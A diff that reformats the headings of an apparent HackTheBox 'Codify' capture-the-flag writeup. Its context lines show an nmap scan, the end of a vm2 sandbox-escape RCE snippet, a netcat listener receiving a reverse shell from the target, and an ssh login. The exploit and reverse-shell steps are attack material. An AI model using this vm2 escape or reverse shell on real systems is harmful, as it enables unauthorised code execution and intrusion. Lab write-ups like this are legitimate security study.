@@ -1,4 +1,5 @@
-# Nmap
+# HackTheBox Codify Writeup
+## Nmap
 ```bash
 Nmap scan report for 10.10.11.239
 Host is up, received user-set (0.015s latency).
@@ -23,7 +24,7 @@ PORT      STATE    SERVICE   REASON         VERSION
 |_http-title: Codify
 ```
 
-## VM2 RCE
+### VM2 RCE
 ```bash
 const { VM } = require("vm2");
 const vm = new VM();
@@ -46,9 +47,9 @@ const code = `
 `;
 
 console.log(vm.run(code));
-
-#-----
-
+```
+### Reverse Shell
+```
 rlwrap nc -lnvp 1234    
 listening on [any] 1234 ...
 connect to [10.10.14.7] from (UNKNOWN) [10.10.11.239] 37654
@@ -90,7 +91,7 @@ Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set t
 Tom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open
 ```
 
-# User Flag
+## User Flag
 ```bash
 ssh joshua@10.10.11.239
 
